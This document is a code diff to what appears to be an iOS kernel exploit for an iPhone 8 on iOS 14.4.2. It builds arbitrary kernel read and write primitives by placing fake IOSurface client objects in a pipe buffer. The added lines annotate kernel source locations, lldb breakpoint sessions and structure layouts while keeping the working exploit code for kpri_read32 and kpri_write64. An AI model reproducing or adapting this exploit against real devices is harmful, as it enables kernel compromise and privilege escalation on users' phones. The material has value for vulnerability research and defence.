@@ -20,6 +20,9 @@ uint64_t pipe_base = 0;
 
 void read_pipe()
 {
+	// read - bsd/kern/sys_generic.c:201
+	// fo_read - bsd/kern/kern_descrip.c:5572
+	// pipe_read - bsd/kern/sys_pipe.c:740
     size_t read_size = pipe_buffer_size - 1;
     read(pipefds[0], pipe_buffer, read_size);
     // printf("pipe_buffer = %s\n", pipe_buffer)
@@ -27,6 +30,7 @@ void read_pipe()
 
 void write_pipe()
 {
+    // pipe_write - bsd/kern/sys_pipe.c:901
     size_t write_size = pipe_buffer_size - 1;
     write(pipefds[1], pipe_buffer, write_size);
 }
@@ -40,6 +44,7 @@ void build_stable_kmem_api()
     uint64_t fp_glob = kread64(rpipe_fp + off_fp_fglob); //kapi_read_kptr(rpipe_fp + OFFSET(fileproc, fp_glob));
     uint64_t rpipe = kread64(fp_glob + off_fg_data); //kapi_read_kptr(fp_glob + OFFSET(fileglob, fg_data));
     pipe_base = kread64(rpipe + off_pb_buffer); //kapi_read_kptr(rpipe + OFFSET(pipe, buffer));
+    printf("pipe_base = 0x%llx\n", pipe_base);
 
     //com.apple.iokit.IOSurface:__text:FFFFFFF008427630                         ; __int64 __fastcall IOSurfaceRootUserClient::release_surface(__int64, unsigned int)
     //com.apple.iokit.IOSurface:__text:FFFFFFF008427630                         __ZN23IOSurfaceRootUserClient15release_surfaceEj
@@ -69,7 +74,7 @@ void build_stable_kmem_api()
     // 0xffffffe4cda8a000: 0x6570697065706970
     // (lldb) x/s 0xffffffe4cda8a000
     // 0xffffffe4cda8a000: "pipepipe\x10\xa0\xa8\xcd\xe4\xff\xff\xffpipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipeL?\xb2\x12\xf0\xff\xff\xffpipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepip"
-    // 0xffffffe4cda8a000 = pipe_buffer
+    // 0xffffffe4cda8a000 = pipe_base
 
 	surfaceClients = kread64(IOSurfaceRootUserClient_addr + 0x118);
 	printf("surfaceClients = 0x%llx\n", surfaceClients);
@@ -119,7 +124,11 @@ uint32_t kpri_read32(uint64_t where) {
     // 0xffffffe4cdca1050: 0xfffffff01ffa7f4c 0x4443424144434241 <- p->surf_obj = where - 0xb4; offsetof(surf_obj, p) = 0x50;
     // 0xffffffe4cdca1060: 0x4443424144434241 0x4443424144434241
     // 0xffffffe4cdca1070: 0x4443424144434241 0x4443424144434241
-    p->uc_obj = pipe_base + 0x10;
+
+    // v7 = *(_QWORD *)(*(_QWORD *)(a1 + 0x118) + 8LL * a2);
+    // *(_QWORD *)(a1 + 0x118) = pipe_base
+    // a2 = 1, so ... + 8 * 1 = 8, meaning offsetof(uc_obj, p) = 0x8;
+    p->uc_obj = pipe_base + 0x10;   //com.apple.iokit.IOSurface:__text:FFFFFFF008422510 00 20 40 F9                             LDR             p->surf_obj, [p->uc_obj,#0x40]
 
     // com.apple.iokit.IOSurface:__text:FFFFFFF00841FA60                         ; __int64 __fastcall sub_FFFFFFF00841FA60(__int64)
     // com.apple.iokit.IOSurface:__text:FFFFFFF00841FA60                         sub_FFFFFFF00841FA60                    ; CODE XREF: IOSurface::getYCbCrMatrix(void)+14↓p
@@ -146,6 +155,75 @@ uint32_t kpri_read32(uint64_t where) {
     // (lldb) reg read w0
     //       w0 = 0xfeedfacf
     p->surf_obj = where - 0xb4;
+    printf("p ptr = %p\n", p);  //p's ptr will be used by copyin's user_addr
+    printf("Going to call write_pipe, set breakpoint first and press any key.\n"); char ch; ch = getchar();
+
+    //  p->uc_obj, p->surf_obj will updated by uiomove in pipe_write - bsd/kern/sys_pipe.c:1046
+    // uio_move - bsd/kern/kern_subr.c:114
+    // error = uiomove(&wpipe->pipe_buffer.buffer[wpipe->pipe_buffer.in], (int)segsize, uio);
+    // error = uiomove(0xffffffe4cdb43000, 0x0000000000000fff, 0xffffffe80f40bc90)
+    // error = uiomove(pipe_base, pipe_buffer_size - 1, 0xffffffe80f40bc90);
+    //struct uio can be found in bsd/sys/uio_internal.h:141
+    // struct uio {
+    //     union iovecs    uio_iovs;               /* current iovec */
+    //     int                             uio_iovcnt;             /* active iovecs */
+    //     off_t                   uio_offset;
+    //     enum uio_seg    uio_segflg;
+    //     enum uio_rw     uio_rw;
+    //     user_size_t     uio_resid_64;
+    //     int                             uio_size;               /* size for use with kfree */
+    //     int                             uio_max_iovs;   /* max number of iovecs this uio_t can hold */
+    //     u_int32_t               uio_flags;
+    // };
+
+    // enum uio_rw { UIO_READ, UIO_WRITE };
+/*
+    bp set in 0xFFFFFFF007EA9C60 + kslide (which means first called uiomove64 in pipe_write / iphone 8, 14.4.2)
+
+    Process 1 stopped
+    * thread #1, stop reason = breakpoint 6.1
+        frame #0: 0xfffffff014cd5c60
+    ->  0xfffffff014cd5c60: bl     0xfffffff014cb2d94
+        0xfffffff014cd5c64: mov    x25, x0
+    (lldb) reg read x2
+          x2 = 0xffffffe80f40bc90
+    (lldb) x/32a $x2
+    0xffffffe80f40bc90: 0xffffffe80f40bcc8      <- p/x offsetof(struct uio, uio_iovs)
+    0xffffffe80f40bc98: 0x00000001 0x00000000   <- p/x offsetof(struct uio, uio_iovcnt), maybe dummy?
+    0xffffffe80f40bca0: 0xffffffffffffffff      <- p/x offsetof(struct uio, uio_offset)
+    0xffffffe80f40bca8: 0x00000008 0x00000001   <- p/x offsetof(struct uio, uio_segflg), 0x8=UIO_USERSPACE64 / p/x offsetof(struct uio, uio_rw), 0x1=UIO_WRITE
+    0xffffffe80f40bcb0: 0x0000000000000fff      <- p/x offsetof(struct uio, uio_resid_64) 
+    0xffffffe80f40bcb8: 0x00000048 0x00000001   <- p/x offsetof(struct uio, uio_size) / p/x offsetof(struct uio, uio_max_iovs)
+    0xffffffe80f40bcc0: 0x0000000000000001      <- p/x offsetof(struct uio, uio_flags)
+    ...
+*/
+
+    // will be called copyin from uiomove64; error = copyin(uio->uio_iovs.uiovp->iov_base, CAST_DOWN(caddr_t, cp), (size_t)acnt);
+    // which is in bsd/kern/kern_subr.c:176
+
+    // copyin - osfmk/arm64/copyio.c:222
+    // int copyin(const user_addr_t user_addr, void *kernel_addr, vm_size_t nbytes);
+    
+/*
+    bp set in FFFFFFF007E86EF4 + kslide (which means first called copyin in uiomove64 / iphone 8, 14.4.2)
+
+    Process 1 stopped
+    * thread #2, stop reason = breakpoint 10.1
+        frame #0: 0xfffffff014cb2ef4
+    ->  0xfffffff014cb2ef4: bl     _copyin
+        0xfffffff014cb2ef8: cbz    w0, 0xfffffff014cb2fc8
+        0xfffffff014cb2efc: b      0xfffffff014cb2fe4
+        0xfffffff014cb2f00: cmp    x22, x23
+    Target 1: (kernelcache.iPhone10,1.18D70) stopped.
+    (lldb) reg read
+    General Purpose Registers:
+            x0 = 0x000000010500e400 <- user_addr
+            x1 = 0xffffffe4cdb43000 <- pipe_base
+            x2 = 0x0000000000000fff <- nbytes
+*/
+
+
+
     write_pipe();
 
     //call stack:
@@ -178,7 +256,7 @@ uint32_t kpri_read32(uint64_t where) {
     //__TEXT_EXEC:__text:FFFFFFF0080AD5D4                         ; __int64 __fastcall fleh_synchronous(__int64)
     //__TEXT_EXEC:__text:FFFFFFF0080AD5F8 8D 26 EB 97                             BL              _sleh_synchronous
 
-    printf("Going to call iosurface_s_get_ycbcrmatrix, set breakpoint first and press any key.\n"); char ch; ch = getchar();
+    printf("Going to call iosurface_s_get_ycbcrmatrix, set breakpoint first and press any key.\n"); ch = getchar();
     
     uint32_t v = iosurface_s_get_ycbcrmatrix();
     read_pipe();
@@ -187,8 +265,10 @@ uint32_t kpri_read32(uint64_t where) {
 
 void kpri_write64(uint64_t where, uint64_t what) {
     struct fake_client *p = (void *)pipe_buffer;
+
     p->uc_obj = pipe_base + 0x10;
     p->surf_obj = pipe_base;
+
     // com.apple.iokit.IOSurface:__text:FFFFFFF0084218F8                         ; __int64 __fastcall IOSurface::setIndexedTimestamp(__int64, unsigned __int64, __int64)
     // com.apple.iokit.IOSurface:__text:FFFFFFF0084218F8                         __ZN9IOSurface19setIndexedTimestampEyy  ; CODE XREF: IOSurfaceRootUserClient::set_indexed_timestamp(uint,ulong long,ulong long)+5C↓p
     // com.apple.iokit.IOSurface:__text:FFFFFFF0084218F8 3F 0C 00 F1                             CMP             X1, #3
@@ -205,6 +285,7 @@ void kpri_write64(uint64_t where, uint64_t what) {
     // com.apple.iokit.IOSurface:__text:FFFFFFF00842191C C0 03 5F D6                             RET
     p->shared_RW = where;
     write_pipe();
+
     //com.apple.iokit.IOSurface:__text:FFFFFFF008426E44                         ; __int64 __fastcall IOSurfaceRootUserClient::s_set_indexed_timestamp(__int64, __int64, __int64)
     iosurface_s_set_indexed_timestamp(what);
     read_pipe();
